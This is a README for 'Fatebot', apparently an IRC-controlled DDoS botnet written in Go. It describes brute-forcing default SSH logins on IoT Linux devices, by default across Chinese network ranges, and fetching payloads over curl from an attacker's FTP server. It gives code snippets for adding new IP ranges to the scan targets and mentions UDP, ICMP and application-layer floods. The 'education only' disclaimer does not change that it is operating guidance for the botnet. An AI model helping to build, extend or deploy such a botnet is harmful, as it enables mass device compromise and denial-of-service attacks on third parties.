# Fatebot v0.3.1
This is my first IRC bot for launch ddos attack, Mainly of scan target are IoT device that run linux and open default SSH port, This bot is write on Go language. For education purpose only. Please test it in your lab. And i create this for join university in the future not for attack anyone server with out any permission!!!

# Infect
The infect function of this botnet is scanning by default SSH port<strong>(Default are scan on range of CHN network. You can add more or change it, if you want.)</strong>
and login by Brute-force attack. This botnet use "curl" to get payload from FTP server, so... please prepair your FTP server first, It very important for infect process.

<strong>I scan on my private netowrk in SSH range, And comment a function of running session.(That why bot is not join The server.)</strong>

# Add more IP range

(1) Add your new ip range in to The group of const varible.

		var_name = "224." //224.0.0.0 - 224.255.255.255
		or
		var_anme = "224.12" //224.12.0.0 - 224.255.255.255

(2) Go to "NextIP" function, Add The case for your ip range and return range of your ip.

		case var_name:
				return ManageIP_range(ipRange, GenRange(255, 0))
		or
		case var_name:
				return ManageIP_range(ipRange, "")

(3) Then go to The "SSH_Conn" function, And add your constant ip range to The array name "NetArr".

		NetArr := []string{
			chpn1, chpn2, chpn3, chpn4, chpn5, cgpn1, cgpn2, cgpn3,
			cgpn4, cgpn5, cgpn6, var_name,
		}

# DDoS
Raw socket programming is really hard for me. That's why all of <strong>The volumetric</strong> are a simple like udp and icmp flood.
Main DDoS function is on <strong>The Application layer</strong>.
